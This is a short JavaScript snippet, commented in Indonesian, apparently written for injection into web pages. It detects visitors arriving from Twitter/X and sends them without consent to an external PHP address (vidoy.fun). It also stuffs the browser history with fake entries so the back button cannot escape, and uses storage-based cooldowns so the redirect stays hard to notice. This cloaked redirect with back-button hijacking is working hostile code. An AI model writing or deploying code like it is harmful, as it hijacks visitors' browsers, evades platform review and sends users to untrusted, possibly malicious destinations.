(function () {
  try {
    // === SETTING ===
    var target = "https://vidoy.fun/cB6Tyq0.php"; // tujuan (HTTPS)
    var cooldownMs = 60 * 1000;                   // 1 menit (ubah bila perlu)
    var historyPadding = 5;                       // jumlah bantalan history
    // ===============

    if (!/^https:\/\//i.test(target)) return;

    var qs = location.search + location.hash;
    if (/[?#](?:.*[&?])?noredir=1(?:&|$)/i.test(qs)) return;
    var forceX = /[?#](?:.*[&?])?onlyx=1(?:&|$)/i.test(qs);

    // Deteksi Twitter/X
    var REF = String(document.referrer || "");
    var UA  = String(navigator.userAgent || "");
    var isX = /(t\.co|twitter\.com)/i.test(REF) || /twitter/i.test(UA) || forceX;
    if (!isX) return;

    // Anti-loop: per tab + cooldown global
    var page = location.origin + location.pathname; // abaikan query biar konsisten
    var sessKey = "redir_x_seen:" + page + "|" + target;
    var cdKey   = "redir_x_cd:"   + page + "|" + target;

    var now   = Date.now();
    if (sessionStorage.getItem(sessKey)) return;
    var until = parseInt(localStorage.getItem(cdKey) || "0", 10);
    if (now < until) return;

    // Lock dulu
    sessionStorage.setItem(sessKey, "1");

    // Kalau halaman jadi "hidden" segera setelah trigger (tanda user pindah ke target),
    // set cooldown lebih panjang supaya saat balik tidak redirect lagi.
    var longCooldownMs = Math.max(cooldownMs, 5 * 60 * 1000); // min 5 menit
    var armed = true;
    function visHandler() {
      if (!armed) return;
      if (document.visibilityState === "hidden") {
        armed = false;
        localStorage.setItem(cdKey, String(Date.now() + longCooldownMs));
      }
    }
    document.addEventListener("visibilitychange", visHandler, true);

    // Tambah bantalan history beberapa lapis (supaya back tidak nutup webview)
    try {
      for (var i = 1; i <= historyPadding; i++) {
        var url = location.pathname + location.search + "#hold" + i;
        history.pushState({ hold: i }, "", url);
      }
    } catch (_) {}

    // Cadangan: kalau ternyata tidak sempat hidden (mis. target cepat ditutup),
    // tetap set cooldown biasa agar tidak nge-loop saat user balik
    setTimeout(function () {
      if (armed) {
        localStorage.setItem(cdKey, String(Date.now() + cooldownMs));
      }
    }, 1500);

    // Redirect (tanpa replace), beri delay kecil biar WebView X lebih patuh
    setTimeout(function () {
      try { location.href = target; } catch (_) {}
    }, 120);

    // Saat user balik via back/gestur, halaman bisa datang dari BFCache (pageshow persisted).
    // Pastikan tidak re-trigger: sessKey sudah mencegah, tapi kita clear hash biar bersih.
    window.addEventListener("pageshow", function () {
      try {
        if (location.hash && /#hold\d+$/.test(location.hash)) {
          history.replaceState({}, "", location.pathname + location.search);
        }
      } catch (_) {}
    });

  } catch (_) {
    // diemkan error
  }
})();
